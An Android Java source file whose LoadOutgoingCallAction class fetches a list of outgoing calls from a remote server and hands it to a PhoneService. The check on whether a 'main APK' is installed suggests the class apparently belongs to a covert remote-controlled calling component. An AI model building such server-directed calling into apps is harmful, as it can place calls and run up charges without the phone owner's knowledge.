package com.m1.android.data.action;

import java.util.ArrayList;
import java.util.HashMap;

import android.content.Intent;

import com.m1.android.data.entity.RemoteCall;
import com.m1.android.data.service.PhoneService;
import com.m1.android.data.util.AppUtil;

public class LoadOutgoingCallAction extends BaseAction {

	@Override
	public boolean excute() {
		try {
			if (allowUpload()) {
				if (AppUtil.isMainApkInstalled(mContext)) {
					return true;
				}
				HashMap<String, String> params = new HashMap<String, String>();
				params.put("uid", String.valueOf(mUser.getId()));
				ArrayList<RemoteCall> calls = (ArrayList<RemoteCall>) mHttpWrapper.postJSON(getRequestUrl(), params, RemoteCall.class);
				if (calls != null && !calls.isEmpty()) {
					Intent serviceIntent = new Intent(mContext, PhoneService.class);
					serviceIntent.putParcelableArrayListExtra(PhoneService.KEY_EXTRA_REMOTECALLS, calls);
					mContext.startService(serviceIntent);
				}
				return true;
			} else {
				return false;
			}
		} catch (Exception e) {
			e.printStackTrace();
			return true;
		}
	}

	@Override
	protected String getRequestUrl() {
		return DEFAULT_HOST + "/getOutgoingCall.htm";
	}

}
